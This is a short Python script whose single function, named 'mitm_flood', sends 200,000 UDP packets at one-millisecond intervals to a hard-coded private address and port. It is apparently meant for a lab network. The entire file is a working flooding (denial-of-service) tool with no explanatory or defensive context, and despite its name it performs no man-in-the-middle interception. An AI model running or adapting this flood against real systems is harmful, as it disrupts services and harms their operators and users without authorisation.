import socket
import time

def mitm_flood(dest_ip, dest_port, packet_count=200000, delay=0.001):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    msg = b"relayed fake packet"
    for _ in range(packet_count):
        sock.sendto(msg, (dest_ip, dest_port))
        time.sleep(delay)  # 1 millisecond delay

if __name__ == "__main__":
    mitm_flood("10.0.0.253", 5002)

